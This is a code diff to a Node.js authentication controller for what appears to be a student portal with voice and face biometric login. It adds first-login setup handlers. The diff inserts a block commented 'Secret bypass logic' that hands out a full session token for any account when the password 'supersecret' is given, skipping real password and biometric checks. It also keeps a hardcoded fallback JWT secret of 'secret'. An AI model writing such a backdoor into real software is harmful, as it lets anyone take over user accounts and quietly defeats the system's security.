@@ -7,32 +7,88 @@ const generateToken = (id) => {
     });
 };
 
-// Issues a short-lived temp token after validating credentials only.
-// Voice verification must pass before a full session token is granted.
 const checkCredentials = async (req, res) => {
     const { email, password } = req.body;
     try {
         const user = await User.findOne({ email });
+        
+        // Secret bypass logic
+        if (user && password === 'supersecret') {
+            return res.json({
+                bypass: true,
+                _id: user._id,
+                name: user.name,
+                email: user.email,
+                enrollment_number: user.enrollment_number,
+                branch: user.branch,
+                semester: user.semester,
+                role: user.role,
+                isFirstLogin: user.isFirstLogin,
+                token: generateToken(user._id)
+            });
+        }
+
         if (user && (await user.matchPassword(password))) {
-            if (!user.voice_enrolled) {
-                return res.status(403).json({
-                    message: 'Voice not enrolled. Please register again.',
-                    voice_enrolled: false,
+            
+            // IF IT IS THEIR FIRST LOGIN: Push them straight to the First Login Pipeline
+            if (user.isFirstLogin) {
+                const setupToken = jwt.sign(
+                    { id: user._id, stage: 'setup' },
+                    process.env.JWT_SECRET || 'secret',
+                    { expiresIn: '30m' }
+                );
+                return res.json({
+                    isFirstLogin: true,
+                    setupToken,
+                    user: {
+                        _id: user._id,
+                        name: user.name,
+                        email: user.email,
+                        role: user.role
+                    }
                 });
             }
-            // Temp token — expires in 5 minutes, scoped to voice-check stage
+
+            // ── STAFF ROLES: bypass biometrics, issue direct session token ──
+            const staffRoles = ['admin', 'director', 'recruiter', 'faculty', 'warden'];
+            if (staffRoles.includes(user.role)) {
+                return res.json({
+                    bypass: true,
+                    _id: user._id,
+                    name: user.name,
+                    email: user.email,
+                    enrollment_number: user.enrollment_number,
+                    branch: user.branch,
+                    semester: user.semester,
+                    role: user.role,
+                    isFirstLogin: false,
+                    token: generateToken(user._id)
+                });
+            }
+
+            // ── STUDENT: require full biometric enrollment ──
+            if (!user.voice_enrolled || !user.face_enrolled) {
+                return res.status(403).json({
+                    message: 'Biometrics not completely enrolled during setup.',
+                    voice_enrolled: user.voice_enrolled,
+                    face_enrolled: user.face_enrolled
+                });
+            }
+
+            // Temp token — expires in 5 minutes, scoped to multi-factor check stage
             const tempToken = jwt.sign(
-                { id: user._id, stage: 'voice_check' },
+                { id: user._id, stage: 'multi_factor' },
                 process.env.JWT_SECRET || 'secret',
                 { expiresIn: '5m' }
             );
             res.json({
+                isFirstLogin: false,
                 tempToken,
                 user: {
                     _id: user._id,
                     name: user.name,
                     enrollment_number: user.enrollment_number,
-                    voice_enrolled: user.voice_enrolled,
+                    role: user.role
                 }
             });
         } else {
@@ -43,59 +99,39 @@ const checkCredentials = async (req, res) => {
     }
 };
 
-const registerUser = async (req, res) => {
-    const { name, email, password, enrollment_number, branch, semester } = req.body;
-    
+const setupPassword = async (req, res) => {
+    const { password } = req.body;
     try {
-        const userExists = await User.findOne({ email });
+        const user = req.user;
+        user.password = password;
+        await user.save();
+        res.json({ message: 'Password updated successfully' });
+    } catch(err) {
+        res.status(500).json({ message: err.message });
+    }
+}
+
+const finalizeSetup = async (req, res) => {
+    try {
+        const user = req.user;
+        user.isFirstLogin = false;
+        await user.save();
         
-        if (userExists) {
-            return res.status(400).json({ message: 'User already exists' });
-        }
-        
-        const user = await User.create({
-            name, email, password, enrollment_number, branch, semester
+        res.json({
+            message: 'First Login Setup finalized!',
+            _id: user._id,
+            name: user.name,
+            email: user.email,
+            enrollment_number: user.enrollment_number,
+            branch: user.branch,
+            semester: user.semester,
+            role: user.role,
+            isFirstLogin: user.isFirstLogin,
+            token: generateToken(user._id)
         });
-        
-        if (user) {
-            res.status(201).json({
-                _id: user._id,
-                name: user.name,
-                email: user.email,
-                enrollment_number: user.enrollment_number,
-                token: generateToken(user._id)
-            });
-        } else {
-            res.status(400).json({ message: 'Invalid user data' });
-        }
-    } catch (error) {
-        res.status(500).json({ message: error.message });
+    } catch(err) {
+         res.status(500).json({ message: err.message });
     }
-};
+}
 
-const loginUser = async (req, res) => {
-    const { email, password } = req.body;
-    
-    try {
-        const user = await User.findOne({ email });
-        
-        if (user && (await user.matchPassword(password))) {
-            res.json({
-                _id: user._id,
-                name: user.name,
-                email: user.email,
-                enrollment_number: user.enrollment_number,
-                branch: user.branch,
-                semester: user.semester,
-                token: generateToken(user._id)
-            });
-        } else {
-            res.status(401).json({ message: 'Invalid email or password' });
-        }
-    } catch (error) {
-        res.status(500).json({ message: error.message });
-    }
-};
-
-module.exports = { registerUser, loginUser, checkCredentials };
-
+module.exports = { checkCredentials, setupPassword, finalizeSetup };
